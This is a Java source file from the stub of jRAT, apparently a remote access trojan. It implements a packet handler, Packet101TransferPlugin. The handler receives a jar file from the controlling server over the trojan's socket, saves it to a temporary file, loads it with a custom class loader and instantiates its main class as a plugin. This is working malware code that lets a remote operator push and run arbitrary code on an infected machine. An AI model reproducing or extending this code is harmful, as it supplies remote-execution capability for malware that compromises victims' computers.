package se.jrat.stub.packets.incoming;

import java.io.File;
import java.io.FileInputStream;
import java.util.jar.JarFile;
import java.util.jar.JarInputStream;

import se.jrat.common.Logger;
import se.jrat.common.io.FileIO;
import se.jrat.common.utils.JarUtils;
import se.jrat.stub.Connection;
import se.jrat.stub.Main;
import se.jrat.stub.Plugin;
import se.jrat.stub.PluginClassLoader;


public class Packet101TransferPlugin extends AbstractIncomingPacket {
	
	public Packet101TransferPlugin() {
	
	}

	@Override
	public void read() throws Exception {
		String name = Connection.instance.readLine();		
		
		File file = File.createTempFile(name, ".jar");
		
		FileIO io = new FileIO();
		io.readFile(file, Connection.instance.getSocket(), Connection.instance.getDataInputStream(), Connection.instance.getDataOutputStream(), null, Main.getKey());
		
		FileInputStream fis = new FileInputStream(file);
		JarInputStream jis = new JarInputStream(fis);
		ClassLoader cl = new PluginClassLoader(this.getClass().getClassLoader(), jis);
		fis.close();
		jis.close();
		
		String mainClass;

		try {
			mainClass = JarUtils.getMainClassFromInfo(new JarFile(file));
		} catch (Exception ex) {
			ex.printStackTrace();
			Logger.log("Failed loading main class from plugin.txt, trying meta-inf");
			mainClass = JarUtils.getMainClass(new JarFile(file));
		}
		
		try {
			Plugin p = new Plugin();
			System.out.println(mainClass);

			Class<?> clazz = Class.forName(mainClass, true, cl);
			p.instance = clazz.newInstance();
			
			Plugin.addMethods(p, clazz);
			
			Plugin.list.add(p);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
}
